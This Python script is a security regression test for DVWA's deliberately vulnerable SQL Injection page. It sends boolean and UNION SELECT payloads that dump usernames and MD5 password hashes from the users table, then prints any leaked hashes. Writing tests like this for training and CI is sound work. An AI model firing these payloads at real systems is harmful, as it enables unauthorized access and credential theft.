#!/usr/bin/env python3
"""
DVWA SQL Injection — Security Regression Test
=================================================

Purpose
-------
Verifies that the DVWA "SQL Injection" vulnerability page (security=low)
is reachable and that the `id` parameter allows classic UNION-based
injection -- dumping usernames and password hashes from the `users`
table instead of returning the single record the form was designed for.

Same shape as dvwa_lfi_regression_test.py: login, set security level,
send a baseline request, send payloads, compare.

This is intended to run against a LOCAL, AUTHORIZED, INTENTIONALLY
VULNERABLE training instance of DVWA (e.g. http://127.0.0.1:8080).
Do not point this at any host you do not own or have explicit written
authorization to test.

CI/CD usage
-----------
Exit codes:
    0 -> SQLi NOT confirmed
    1 -> SQLi CONFIRMED (credentials dumped via UNION injection)
    2 -> Script/environment error (couldn't log in, target unreachable, etc.)
"""

import re
import sys
import argparse
from urllib.parse import urljoin
from dvwa_common import log, get_csrf_token, login, set_security_level
from pathlib import Path
from sarif_utils import write_finding

import requests


DEFAULT_BASE_URL = "http://127.0.0.1:8080"
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"

# DVWA's normal sqli result row always contains this literal label once
# per returned record. Counting occurrences tells us how many rows came
# back -- the single-record form should only ever produce one.
ROW_MARKER = "First name:"

# A UNION SELECT user, password FROM users leak surfaces raw MD5 hashes
# (DVWA stores passwords unsalted as MD5 at low security) -- a 32-char
# hex string appearing in the body is a strong, low-false-positive signal.
MD5_PATTERN = re.compile(r"\b[a-f0-9]{32}\b")

def send_sqli_request(session: requests.Session, sqli_url: str, id_param: str) -> requests.Response:
    """
    DVWA's sqli page expects both `id` and `Submit` as GET params
    (it's a form that submits via GET, not POST). The trailing comment
    markers in the payloads neutralize whatever the original query
    appended after the injected value.
    """
    resp = session.get(sqli_url, params={"id": id_param, "Submit": "Submit"}, timeout=10)
    resp.raise_for_status()
    return resp


def run_sqli_poc(session: requests.Session, base_url: str) -> tuple[bool, str, dict]:
    sqli_url = urljoin(base_url, "/vulnerabilities/sqli/")

    log(f"Baseline request: id=1 (expected single legitimate record)")
    baseline_resp = send_sqli_request(session, sqli_url, "1")
    baseline_length = len(baseline_resp.content)
    baseline_rows = baseline_resp.text.count(ROW_MARKER)
    log(f"Baseline: {baseline_length} bytes, {baseline_rows} row(s), "
        f"status={baseline_resp.status_code}, final_url={baseline_resp.url}")

    payload_candidates = [
        "1' OR '1'='1",                                        # classic boolean-based: dumps every row
        "1' UNION SELECT user, password FROM users-- -",       # UNION-based: dumps raw credentials
        "1' UNION SELECT user, password FROM users#",          # MySQL '#' comment variant
    ]

    report = {"baseline_length": baseline_length, "baseline_rows": baseline_rows, "attempts": []}

    for payload in payload_candidates:
        resp = send_sqli_request(session, sqli_url, payload)
        length = len(resp.content)
        row_count = resp.text.count(ROW_MARKER)
        hashes_found = MD5_PATTERN.findall(resp.text)
        extra_rows = row_count > baseline_rows
        leaked_hash = len(hashes_found) > 0

        log(f"id={payload!r} -> {length} bytes, {row_count} row(s) "
            f"(baseline had {baseline_rows}), md5_hashes_found={len(hashes_found)}")

        report["attempts"].append({
            "payload": payload,
            "content_length": length,
            "row_count": row_count,
            "extra_rows": extra_rows,
            "md5_hashes_found": len(hashes_found),
        })

        # Confirmed only when we got MORE rows than the legitimate single
        # record AND actual-looking credential material (MD5 hash) showed
        # up in the body -- either signal alone could be a coincidence;
        # together they're a real leak.
        if extra_rows and leaked_hash:
            return True, resp.text, report

    return False, resp.text, report


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="DVWA base URL (default: %(default)s)")
    parser.add_argument("--username", default=DEFAULT_USERNAME, help="DVWA login username")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help="DVWA login password")
    parser.add_argument("--security-level", default="low", choices=["low", "medium", "high", "impossible"],
                         help="DVWA security level to set before testing (default: %(default)s)")
    parser.add_argument("--finding-out", default=None,
                         help="Path to write a JSON finding file for SARIF aggregation")
    args = parser.parse_args()

    session = requests.Session()

    try:
        if not login(session, args.base_url, args.username, args.password):
            log("Aborting: authentication failed.")
            return 2

        if not set_security_level(session, args.base_url, args.security_level):
            log("Aborting: could not set security level.")
            return 2

        confirmed, body, report = run_sqli_poc(session, args.base_url)

    except requests.exceptions.RequestException as exc:
        log(f"Request error: {exc}")
        return 2

    print("\n" + "=" * 70)
    print(f"Baseline: {report['baseline_length']} bytes, {report['baseline_rows']} row(s)")
    for attempt in report["attempts"]:
        flag = "LEAK" if attempt["extra_rows"] and attempt["md5_hashes_found"] > 0 else "    "
        print(f"[{flag}] id={attempt['payload']!r:50} "
              f"rows={attempt['row_count']} md5_hashes={attempt['md5_hashes_found']}")
    print("=" * 70)

    if args.finding_out:
        write_finding(
            path=Path(args.finding_out),
            rule_id="dvwa-sqli-001",
            rule_name="SQL Injection",
            message="UNION-based SQL injection via unsanitized 'id' parameter on DVWA SQL Injection endpoint",
            uri="vulnerabilities/sqli/",
            confirmed=confirmed,
            security_level=args.security_level,
        )

    if confirmed:
        print("[CONFIRMED] SQL Injection leaked credential data via UNION SELECT.")
        print("=" * 70)
        for line in body.splitlines():
            stripped = line.strip()
            if MD5_PATTERN.search(stripped):
                print(stripped)
        print("=" * 70 + "\n")
        return 1
    else:
        print("[NOT CONFIRMED] Payloads did not produce extra rows with leaked credential hashes.")
        print("=" * 70 + "\n")
        return 0


if __name__ == "__main__":
    sys.exit(main())
